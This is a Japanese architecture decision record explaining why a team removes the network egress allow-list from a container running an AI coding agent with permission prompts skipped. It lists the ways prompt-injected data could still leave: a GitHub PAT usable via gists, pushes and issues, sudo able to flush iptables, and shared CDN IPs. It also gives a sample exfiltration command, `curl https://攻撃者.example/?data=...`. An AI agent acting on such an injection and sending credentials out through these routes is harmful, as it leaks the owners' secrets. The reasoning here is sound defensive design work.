# ADR 0011: エージェントコンテナの外向き通信の許可リストをやめる

- ステータス: 採用
- 日付: 2026-08-01
- 関連: [ADR 0009](0009-agent-container.md) の「外向き通信を許可リスト化」を取り消す

## 背景

ADR 0009 で、コンテナの外向き通信を iptables + ipset の許可リストに絞った。
`--dangerously-skip-permissions` が「インターネットの無いサンドボックス向け」とされており、
承認なしで何でも実行できる状態ではプロンプトインジェクションによる持ち出しを止められない、
というのが理由だった。

運用してみて、効果と費用の両方が当初の想定と違っていた。

### 想定より効いていなかった

持ち出し経路が塞げていない。

- **GitHub が全面許可**。PAT はコンテナ内にある。gist の作成、リポジトリへの push、
  issue の作成はどれも持ち出しに使えて、全部通る
- **Google も全面許可**。dev の BigQuery や GCS に書ける
- **コンテナ内に sudo がある**。`sudo iptables -F` で消せる（ADR 0009 に自分で書いていた）

さらに、IP ベースであることによる穴が実測で見つかった。
許可リストはホスト名を起動時に解決して `/32` で入れているが、CDN の anycast IP は
複数のサイトで共有される。

```
pypi.org                     151.101.0.223 151.101.128.223 151.101.192.223 151.101.64.223
files.pythonhosted.org       151.101.0.223 151.101.128.223 151.101.192.223 151.101.64.223
docs.python.org              151.101.0.223 151.101.128.223 151.101.192.223 151.101.64.223
```

pypi.org を許可した時点で、同じ Fastly の IP に載っているサイトが一緒に通る。
GitHub Pages の IP（`185.199.108-111.153`）も同様で、`playwright.dev` が通っていた。
iptables は Host ヘッダも SNI も見られないので、これは原理的に避けられない。

結果として許可リストの境界は、意図した範囲ではなく
**「たまたま同じ IP に同居しているホスト」を通す形**になっていた。

### 想定より費用が高かった

画面が CDN から cytoscape.js を読んでいたため、コンテナ内で E2E が一度も通っていなかった。
DROP は無言でタイムアウトするので「Playwright が動かない」ようにしか見えず、
実際に誤診された（[ADR 0010](0010-no-runtime-cdn.md)）。

WebFetch も同様に、通るサイトと通らないサイトが上記の同居関係で決まる。
「使えない」でも「使える」でもなく**予測できない**状態だった。

起動時に `goog.json` と `api.github.com/meta` を取りに行くが、失敗しても
「取得失敗（スキップ）」と出して先に進む。許可リストが虫食いのまま起動しうる。

## 決定

**許可リストをやめる。`docker/init-firewall.sh` を削除し、
`cap_add: NET_ADMIN / NET_RAW` も外す。**

`make agent-firewall` も無くなる。

## 理由

雑な持ち出し（`curl https://攻撃者.example/?data=...`）は確かに止まっていた。
インジェクションのペイロードとしてはこれが一番ありがちなので、価値はゼロではない。

しかし PAT が GitHub 経由で出ていく穴が開いたままである以上、
守れているのは「一番雑な攻撃だけ」で、その対価として
予測不能な通信の失敗と、原因の分かりにくい不具合を抱えていた。

**残すことの害は、これがあるから安全だと錯覚することにある。**
実際に効いている層は別にある。

| 層 | 実効性 |
|---|---|
| [ADR 0008](0008-scoped-credentials.md) のスコープ付き認証 | **本命。** 書き込みは dev に限られ、staging / prod は権限で守られる |
| docker ソケットを渡さない・マウント最小 | ホストへの侵害を防ぐ |
| ブランチ保護・タグでのみ本番リリース | コードが勝手に本番へ出ない |
| 個人情報を持たない設計 | プロフィールは localStorage。制度データは元々オープンデータ |

capability を減らせるのも理由の一つ。NET_ADMIN と NET_RAW はコンテナに渡す特権であり、
それを外せるぶん、隔離という観点では**むしろ良くなる**。

## 帰結

- WebFetch が普通に使えるようになる。通信の失敗を疑う手間が消える
- コンテナの capability が既定のみになる
- 起動が速くなり、外部 JSON の取得失敗という不安定要素が消える
- **ネットワーク層での持ち出し対策は無くなる。**
  `--dangerously-skip-permissions` を支えるのは ADR 0008 のスコープ付き認証と
  コンテナの隔離だけになる
- 依存関係として、コンテナ内で扱う認証情報の価値を上げないことが以前より重要になる

## 積み残し

コンテナ内の GitHub PAT が `repo` + `workflow` と広い。
持ち出されたときの被害はここが一番大きいので、絞れるなら絞るのが次の一手。
ネットワークで塞ぐより、**そもそも盗まれて困るものを置かない**方が筋がよい。

本気で通信を絞るなら、IP ではなくホスト名で判断できる HTTP プロキシを挟む形になる。
その場合もログが残るぶん監査には役立つが、GitHub / Google を許可する限り
持ち出し経路自体は塞げないことは変わらない。
